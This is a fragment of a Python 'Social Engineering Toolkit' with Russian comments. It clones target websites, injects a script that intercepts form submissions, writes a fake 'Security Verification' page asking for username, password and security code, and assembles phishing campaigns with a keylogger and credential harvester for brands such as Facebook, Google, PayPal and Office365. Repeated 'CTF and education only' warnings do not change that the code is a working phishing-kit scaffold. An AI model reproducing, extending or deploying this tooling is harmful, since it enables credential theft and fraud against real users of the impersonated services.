            print_success(f"Загружен: {filename}")
            
        except Exception as e:
            error_msg = f"Ошибка загрузки {url}: {e}"
            result['errors'].append(error_msg)
    
    def _create_modified_version(self, soup: BeautifulSoup, output_dir: str, result: Dict):
        """Создание модифицированной версии с перехватом данных"""
        print_info("Создание модифицированной версии...")
        
        # Модифицируем формы для перехвата данных
        modified_soup = BeautifulSoup(str(soup), 'html.parser')
        
        # Добавляем скрипт для перехвата данных
        script_tag = modified_soup.new_tag('script')
        script_tag.string = """
        // CTF Data Interceptor
        document.addEventListener('DOMContentLoaded', function() {
            // Перехватываем все формы
            const forms = document.querySelectorAll('form');
            forms.forEach((form, index) => {
                form.addEventListener('submit', function(e) {
                    e.preventDefault();
                    
                    const formData = new FormData(form);
                    const data = {};
                    
                    for (let [key, value] of formData.entries()) {
                        data[key] = value;
                    }
                    
                    // Сохраняем данные
                    const interceptedData = {
                        formIndex: index,
                        action: form.action,
                        method: form.method,
                        data: data,
                        timestamp: new Date().toISOString(),
                        url: window.location.href
                    };
                    
                    // Логируем для CTF
                    console.log('CTF Form Intercepted:', interceptedData);
                    
                    // Сохраняем в localStorage
                    localStorage.setItem('ctf_form_' + Date.now(), JSON.stringify(interceptedData));
                    
                    // Показываем уведомление
                    const notification = document.createElement('div');
                    notification.style.cssText = `
                        position: fixed; top: 20px; right: 20px; 
                        background: #4CAF50; color: white; padding: 15px; 
                        border-radius: 5px; z-index: 10000; font-family: Arial;
                    `;
                    notification.textContent = '✅ Данные перехвачены! (CTF Demo)';
                    document.body.appendChild(notification);
                    
                    setTimeout(() => {
                        notification.remove();
                    }, 3000);
                    
                    // Симулируем отправку формы
                    setTimeout(() => {
                        alert('Форма отправлена! (CTF Demo)');
                    }, 1000);
                });
            });
            
            console.log('CTF Website Cloner loaded - Forms intercepted');
        });
        """
        
        # Добавляем скрипт в head
        if modified_soup.head:
            modified_soup.head.append(script_tag)
        else:
            head_tag = modified_soup.new_tag('head')
            head_tag.append(script_tag)
            modified_soup.html.insert(0, head_tag)
        
        # Сохраняем модифицированную версию
        modified_file = os.path.join(output_dir, "index_modified.html")
        with open(modified_file, 'w', encoding='utf-8') as f:
            f.write(str(modified_soup))
        
        result['downloaded_files'].append(modified_file)
        print_success(f"Модифицированная версия: {modified_file}")
    
    def create_phishing_version(self, original_url: str, output_dir: str) -> str:
        """Создание фишинговой версии сайта"""
        print_warning("Создание фишинговой версии...")
        
        # Клонируем сайт
        clone_result = self.clone_website(original_url, output_dir)
        
        if clone_result['errors']:
            print_error("Ошибки при клонировании:")
            for error in clone_result['errors']:
                print_error(f"  - {error}")
        
        # Создаем фишинговую версию
        phishing_file = os.path.join(output_dir, "phishing.html")
        
        phishing_html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Security Verification - {self.domain}</title>
    <style>
        body {{ font-family: Arial, sans-serif; background: #f5f5f5; }}
        .container {{ max-width: 500px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }}
        .header {{ background: #dc3545; color: white; padding: 15px; text-align: center; border-radius: 4px; margin-bottom: 20px; }}
        .warning {{ background: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; border-radius: 4px; margin-bottom: 20px; }}
        input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }}
        button {{ width: 100%; padding: 12px; background: #dc3545; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }}
        .ctf-notice {{ color: #6c757d; font-size: 12px; text-align: center; margin-top: 20px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>🔒 Security Verification Required</h2>
        </div>
        
        <div class="warning">
            <strong>⚠️ Important Security Notice:</strong><br>
            We have detected suspicious activity on your account. Please verify your credentials to secure your account.
        </div>
        
        <form id="verificationForm">
            <input type="text" id="username" placeholder="Username or Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <input type="text" id="securityCode" placeholder="Security Code (if applicable)">
            <button type="submit">Verify Account</button>
        </form>
        
        <div class="ctf-notice">
            CTF DEMO - {original_url} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        </div>
    </div>
    
    <script>
        document.getElementById('verificationForm').addEventListener('submit', function(e) {{
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const securityCode = document.getElementById('securityCode').value;
            
            const credentials = {{
                target: '{original_url}',
                username: username,
                password: password,
                securityCode: securityCode,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                referrer: document.referrer
            }};
            
            // Сохраняем для CTF
            localStorage.setItem('ctf_phishing_' + Date.now(), JSON.stringify(credentials));
            console.log('CTF Phishing Demo - Credentials Captured:', credentials);
            
            alert('CTF Demo: Credentials captured - ' + username);
            
            setTimeout(() => {{
                alert('Account verified successfully! (CTF Demo)');
            }}, 1000);
        }});
    </script>
</body>
</html>
"""
        
        with open(phishing_file, 'w', encoding='utf-8') as f:
            f.write(phishing_html)
        
        print_success(f"Фишинговая версия создана: {phishing_file}")
        return phishing_file

class SocialEngineeringTools:
    """Основной класс социальной инженерии"""
    
    def __init__(self):
        self.phishing_generator = PhishingGenerator()
        self.credential_harvester = CredentialHarvester()
        self.website_cloner = WebsiteCloner()
    
    def generate_phishing_campaign(self, target: str, template: str = 'facebook') -> Dict:
        """Генерация полной фишинговой кампании"""
        print_warning(f"Генерация фишинговой кампании для {target}...")
        
        campaign = {
            'target': target,
            'template': template,
            'timestamp': datetime.now().isoformat(),
            'files': []
        }
        
        # Очищаем target от недопустимых символов для имени файла
        clean_target = target.replace('https://', '').replace('http://', '').replace('/', '_').replace(':', '_').replace('?', '_').replace('&', '_').replace('=', '_')
        
        # Генерируем фишинговую страницу
        phishing_file = self.phishing_generator.generate_phishing_page(
            target, template, f'phishing_{clean_target}_{template}.html'
        )
        if phishing_file:
            campaign['files'].append(phishing_file)
        
        # Генерируем keylogger
        keylogger_file = self.credential_harvester.generate_keylogger_script(
            f'keylogger_{clean_target}.js'
        )
        if keylogger_file:
            campaign['files'].append(keylogger_file)
        
        # Генерируем credential harvester
        harvester_file = self.credential_harvester.generate_credential_harvester(
            target, f'harvester_{clean_target}.html'
        )
        if harvester_file:
            campaign['files'].append(harvester_file)
        
        # Сохраняем информацию о кампании
        campaign_file = f'campaign_{clean_target}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
        try:
            with open(campaign_file, 'w', encoding='utf-8') as f:
                json.dump(campaign, f, indent=2, ensure_ascii=False)
            campaign['files'].append(campaign_file)
            print_success(f"Информация о кампании сохранена: {campaign_file}")
        except Exception as e:
            print_error(f"Ошибка сохранения кампании: {e}")
        
        print_success(f"Фишинговая кампания создана: {len(campaign['files'])} файлов")
        print_warning("⚠️  ВСЕ ФАЙЛЫ СОЗДАНЫ ТОЛЬКО ДЛЯ CTF И ОБРАЗОВАНИЯ!")
        
        return campaign

def main():
    parser = argparse.ArgumentParser(description='Social Engineering Toolkit - ТОЛЬКО ДЛЯ CTF!')
    parser.add_argument('--target', required=True, help='Целевой домен или организация')
    parser.add_argument('--template', choices=['facebook', 'google', 'paypal', 'bank', 'office365'], 
                       default='facebook', help='Шаблон фишинговой страницы')
    parser.add_argument('--phishing-only', action='store_true', help='Только фишинговая страница')
    parser.add_argument('--keylogger-only', action='store_true', help='Только keylogger')
    parser.add_argument('--harvester-only', action='store_true', help='Только credential harvester')
    parser.add_argument('--clone-only', action='store_true', help='Только клонирование сайта')
    parser.add_argument('--clone-phishing', action='store_true', help='Клонирование + фишинговая версия')
    parser.add_argument('--output', help='Имя выходного файла или папки')
    parser.add_argument('--save', action='store_true', help='Сохранить результаты')
    
    args = parser.parse_args()
    
    # Предупреждение
    print_warning("⚠️  СОЦИАЛЬНАЯ ИНЖЕНЕРИЯ - ТОЛЬКО ДЛЯ CTF И ОБРАЗОВАНИЯ!")
    print_warning("⚠️  НЕ ИСПОЛЬЗУЙТЕ ДЛЯ НЕЗАКОННЫХ ЦЕЛЕЙ!")
    print()
    
    tools = SocialEngineeringTools()
    results = []
    
    if args.clone_only:
        # Только клонирование сайта
        output_dir = args.output or f'cloned_{args.target.replace("https://", "").replace("http://", "").replace("/", "_").replace(":", "_").replace("?", "_").replace("&", "_").replace("=", "_")}'
        result = tools.website_cloner.clone_website(args.target, output_dir)
        if result:
            results.append({'type': 'clone', 'result': result})
    
    elif args.clone_phishing:
        # Клонирование + фишинговая версия
        output_dir = args.output or f'phishing_{args.target.replace("https://", "").replace("http://", "").replace("/", "_").replace(":", "_").replace("?", "_").replace("&", "_").replace("=", "_")}'
        phishing_file = tools.website_cloner.create_phishing_version(args.target, output_dir)
        if phishing_file:
            results.append({'type': 'clone_phishing', 'file': phishing_file})
    
    elif args.phishing_only:
        # Только фишинговая страница
        result = tools.phishing_generator.generate_phishing_page(
            args.target, args.template, args.output
        )
        if result:
            results.append({'type': 'phishing', 'file': result})
    
    elif args.keylogger_only:
        # Только keylogger
        clean_target = args.target.replace('https://', '').replace('http://', '').replace('/', '_').replace(':', '_').replace('?', '_').replace('&', '_').replace('=', '_')
        output_file = args.output or f'keylogger_{clean_target}.js'
        result = tools.credential_harvester.generate_keylogger_script(output_file)
        if result:
            results.append({'type': 'keylogger', 'file': result})
    
    elif args.harvester_only:
        # Только credential harvester
        clean_target = args.target.replace('https://', '').replace('http://', '').replace('/', '_').replace(':', '_').replace('?', '_').replace('&', '_').replace('=', '_')
        output_file = args.output or f'harvester_{clean_target}.html'
        result = tools.credential_harvester.generate_credential_harvester(
            args.target, output_file
        )
        if result:
            results.append({'type': 'harvester', 'file': result})
    
    else:
        # Полная кампания
        campaign = tools.generate_phishing_campaign(args.target, args.template)
        results = [{'type': 'campaign', 'data': campaign}]
    
    # Вывод результатов
    print(f"\n{Colors.HEADER}{'=' * 60}{Colors.RESET}")
    print_success(f"Создано файлов: {len(results)}")
    
    for result in results:
        if result['type'] == 'campaign':
            print_info(f"Кампания: {len(result['data']['files'])} файлов")
            for file in result['data']['files']:
                print_info(f"  - {file}")
        elif result['type'] == 'clone':
            clone_data = result['result']
            print_info(f"Клонированный сайт: {clone_data['output_dir']}")
            print_info(f"Файлов загружено: {len(clone_data['downloaded_files'])}")
            print_info(f"Форм найдено: {len(clone_data['forms_found'])}")
            print_info(f"Форм входа: {len(clone_data['login_forms'])}")
            if clone_data['errors']:
                print_warning(f"Ошибок: {len(clone_data['errors'])}")
        elif result['type'] == 'clone_phishing':
            print_info(f"Фишинговая версия: {result['file']}")
        else:
            print_info(f"{result['type']}: {result['file']}")
    
    if args.save and results:
        save_results(results, "social_engineering", "json")
    
    print_warning("\n⚠️  ПОМНИТЕ: Используйте только для легальных CTF и образования!")

if __name__ == "__main__":
    main()
